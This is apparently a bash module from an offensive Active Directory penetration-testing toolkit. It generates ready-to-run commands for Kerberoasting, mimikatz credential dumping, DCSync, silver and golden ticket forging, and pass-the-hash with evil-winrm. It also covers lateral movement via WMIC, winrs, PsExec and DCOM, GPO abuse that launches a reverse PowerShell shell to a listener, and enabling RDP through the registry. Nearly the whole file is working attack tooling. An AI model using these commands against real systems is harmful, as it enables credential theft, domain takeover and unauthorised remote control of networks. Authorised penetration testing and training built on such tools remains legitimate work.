#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source "$SCRIPTDIR/password_cracking.sh"
source "$SCRIPTDIR/impacket.sh"
source "$SCRIPTDIR/mimikatz.sh"
source "$SCRIPTDIR/hashcat.sh"

get_spray_passwords() {
    if [[ ! -f "Spray-Passwords.ps1" ]]; then
        cp $SCRIPTDIR/../ps1/Spray-Passwords.ps1 Spray-Passwords.ps1
    fi
    generate_windows_download Spray-Passwords.ps1

}

get_kerbrute() {
    local kerbrute_url="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe"
    if [[ ! -f "kerbrute_windows_amd64.exe" ]]; then
        wget "$kerbrute_url" -O kerbrute_windows_amd64.exe >> $trail_log
    fi
    generate_windows_download kerbrute_windows_amd64.exe
}

get_crackmapexec_windows() {
    local crackmapexec_url="https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.4.0/cme-windows-latest-3.10.1.zip"
    if [[ ! -f "cme-windows-latest-3.10.1.zip" ]]; then
        wget "$crackmapexec_url" -O cme-windows-latest-3.10.1.zip >> $trail_log
    fi
    if [[ ! -f "cme.exe" ]]; then
        unzip cme-windows-latest-3.10.1.zip >> $trail_log
        mv cme cme.exe
    fi
    generate_windows_download cme.exe
}

get_rubeus() {
    if [[ ! -f "Rubeus.exe" ]]; then
        cp /usr/share/windows-resources/rubeus/Rubeus.exe .
    fi
    generate_windows_download Rubeus.exe
}

perform_kerberoast_rubeus() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.kerberoast"
    fi
    get_rubeus
    echo '.\Rubeus.exe kerberoast /outfile:'$hash_file';'
    upload_file $hash_file
}

get_silverticket_command() {
    if [[ -z "$username" ]] || [[ -z "$domain" ]] || [[ -z "$target_hostname" ]]; then
        echo "Username, domain, and target IP/host address must be set before running SilverTicket command."
        return 1
    fi
    if [[ -z "$target_service" ]]; then
        target_service="http"
    fi
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_silverticket.log"
    fi
    echo '$sid = whoami /user | findstr '$username' | ForEach-Object {$parts = $_.Split('"' '"'); $parts[1]} | ForEach-Object {$last_index=$_.LastIndexOf('"'-'"'); $_.Substring(0,$last_index)}'
    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > '"$mimikatz_log"';'
    echo '$mimikatz_log = Get-Content '$mimikatz_log' -Raw;'
    echo '$matches = $mimikatz_log | Select-String -Pattern "(?s)iis_service.*?SHA1"'
    echo '$ntlm_hash = $matches.Matches.Value | findstr NTLM | ForEach-Object {$last_index=$_.LastIndexOf('"':'"'); $_.SubString($last_index+2)}'
    echo '$username = "'$username'"'
    echo '$domain = "'$domain'"'
    echo '$target = "'$target_hostname'"'
    echo '$target_service = "'$target_service'"'
    echo '.\mimikatz.exe "kerberos::golden /sid:$sid /domain:$domain /ptt /target:$target /service:$target_service /rc4:$ntlm_hash /user:$username" exit'

}

get_dcsync_command() {
    if [[ -z "$target_username" ]]; then
        echo "Target username is required for DCSync command."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.dcsync"
    fi
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_dcsync.log"
    fi
    get_mimikatz
    echo '.\mimikatz.exe "lsadump::dcsync /user:'$target_username'" exit > '$mimikatz_log';'
    upload_file "$mimikatz_log"
    if [[ -f $mimikatz_log ]]; then
        echo "DCSync command executed successfully, log saved to $mimikatz_log."
        sudo dos2unix "$mimikatz_log"
        ntlm_hash=$(grep -oP 'Hash NTLM: \K.*' $mimikatz_log | head -n 1)
        echo "NTLM hash extracted: $ntlm_hash"
        if [[ ! -z "$ntlm_hash" ]]; then
            echo "$ntlm_hash" > "$hash_file"
            hashcat_ntlm
        fi
    fi
}

perform_wmic_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WMIC command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WMIC cmd is required."
        return 1
    fi
    local wmic_command="wmic /node:$target_ip /user:$username /password:$password process call create \"$cmd\""
    echo "$wmic_command"
}

perform_wmic_powershell_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WMIC command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WMIC cmd is required."
        return 1
    fi
    local powershell_commands='$username = '"'$username';"
    powershell_commands+='$password = '"'$password';"
    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
    powershell_commands+='$options = New-CimSessionOption -Protocol DCOM;'
    powershell_commands+='$session = New-Cimsession -ComputerName '$target_ip' -Credential $credential -SessionOption $Options;'
    powershell_commands+='$command = '"'$cmd';"
    powershell_commands+='Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};'
    echo "$powershell_commands"

}

perform_winrs_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WinRM command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WinRM cmd is required."
        return 1
    fi
    local winrs_command="winrs -r:$target_ip -u:$username -p:$password \"$cmd\""
    echo "$winrs_command"
}

perform_powershell_remoting_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WinRM command."
        return 1
    fi
    local powershell_commands='$username = '"'$username';"
    powershell_commands+='$password = '"'$password';"
    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
    powershell_commands+='New-PSSession -ComputerName '$target_ip' -Credential $credential;'
    powershell_commands+='Enter-PSSession 1'
    echo "$powershell_commands"
}

get_psexec() {
    local pstools_link="https://download.sysinternals.com/files/PSTools.zip"
    if [[ ! -f  "PSTools.zip" ]]; then
        wget "$pstools_link" -O PSTools.zip >> $trail_log
    fi
    if [[ -z "$PsExec_exe" ]]; then
        PsExec_exe="PsExec.exe"
    fi
    if [[ ! -d "pstools" ]]; then
        unzip -u PSTools.zip -d pstools >> $trail_log
    fi
    generate_windows_download "pstools/$PsExec_exe" "$PsExec_exe"
}

run_psexec() { 
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_hostname" ]]; then
        echo "Username, password, and target hostname address must be set before running PsExec command."
        return 1
    fi
    echo '--- PSExec criteria ---'
    echo 'credentials must be part of local administrators group'
    echo 'ADMIN$ share must be enabled'
    echo 'File and Printer Sharing must be enabled'
    local psexec_username="$username"
    if [[ ! -z "$domain" ]]; then
        psexec_username="$domain\\$username"
    fi
    get_psexec
    local psexec_command=".\\$PsExec_exe -u $psexec_username -p $password -i \\\\$target_hostname cmd"
    echo "$psexec_command"

}

perform_dcom() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP address must be set before running DCOM command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "DCOM cmd is required."
        return 1
    fi
    local powershell_command='$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","'$target_ip'"));'
    powershell_command+='$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c '$cmd'", "7")'
    echo "$powershell_command"   
}

get_golden_ticket() {
    target_username=krbtgt
    if ! get_ntlm_hash_from_mimikatz_log_lsadump; then
        echo "Failed to extract NTLM hash for $target_username."
        return 1
    fi
    if [[ -z "$domain_sid" ]]; then
        echo "Domain SID is not set, cannot create golden ticket."
        return 1
    fi
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash is not set, cannot create golden ticket."
        return 1
    fi
    get_mimikatz
    get_psexec
    echo '.\mimikatz.exe "kerberos::purge" exit'
    echo '.\mimikatz.exe "kerberos::golden /user:'$username' /domain:'$domain' /sid:'$domain_sid' /'$target_username':'$ntlm_hash' /ptt" exit'
}

perform_gpo_changeowner_windows() {
    if [[ -z "$gpo_owner_username" ]] || [[ -z "$gpo_owner_password" ]] || [[ -z "$target_gpo" ]]; then
        echo "GPO owner username, password, and target IP address must be set before running GPO abuse."
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running GPO abuse."
        return 1
    fi
    get_powerview
    echo "\$SecPassword = ConvertTo-SecureString '$gpo_owner_password' -AsPlainText -Force"
    echo "\$Cred = New-Object System.Management.Automation.PSCredential('$domain\\$gpo_owner_username', \$SecPassword)"
    echo "Set-DomainObjectOwner -Credential \$Cred -Identity '$target_gpo' -OwnerIdentity $domain\\$target_username"
}

perform_gpo_abuse_linux() {
    if [[ ! -d "gpo_abuse" ]]; then
        echo "Creating gpo_abuse directory..."
        mkdir -p "gpo_abuse"
    fi
    if [[ -z "$gpo_owner_username" ]] || [[ -z "$gpo_owner_password" ]] || [[ -z "$gpo_id" ]]; then
        echo "GPO owner username, password, and GPO id must be set before running GPO abuse."
        return 1
    fi
    if [[ -z "$dc_ip" ]]; then
        echo "DC IP address must be set before running GPO abuse."
        return 1
    fi
    if [[ ! -d pyGPOAbuse ]]; then
        git clone https://github.com/Hackndo/pyGPOAbuse.git
    fi
    if [[ -z "$cmd" ]]; then
        echo "Command file already exists, skipping command generation."
    else
        echo $COMMONDIR/start_listener.sh $project $host_port interactive
        cmd=$(get_powershell_interactive_shell $host_port)
    fi
    pushd pyGPOAbuse || exit 1
    python3 pygpoabuse.py $domain/$gpo_owner_username:$gpo_owner_password -gpo-id $gpo_id -command "$cmd" -dc-ip $dc_ip -f
    popd || exit 1
}

# WinRM runs on 5985 by default
run_evil_winrm() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP is not set. Please set it before running"
        return 1        
    fi
    local username_option=""
    if [[ -z "$username" ]]; then
        echo "Username is not set. Please set it before running"
        return 1        
    fi
    username_option="-u $username"
    local password_option=""
    if [[ -z "$password" ]]; then
        echo "Password is not set. Ensure you are passing hashes"        
        if [[ -z "$ntlm_hash" ]]; then
            echo "NTLM hash is not set. Please set it before running"
            return 1
        else
            password_option="-H ${ntlm_hash^^}"
        fi  
    else
        password_option="-p $password"
    fi
    if pgrep -f "evil-winrm -i $target_ip"; then
        echo "Evil-WinRM is already running for $target_ip"
        return 0
    fi
    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Running evil-winrm with proxychains"
    else
        proxychain_command=""
    fi
    echo ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option"
    eval ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option" | tee >(remove_color_to_log >> $trail_log)

}   

enable_rdp_commands() {
    echo 'reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
}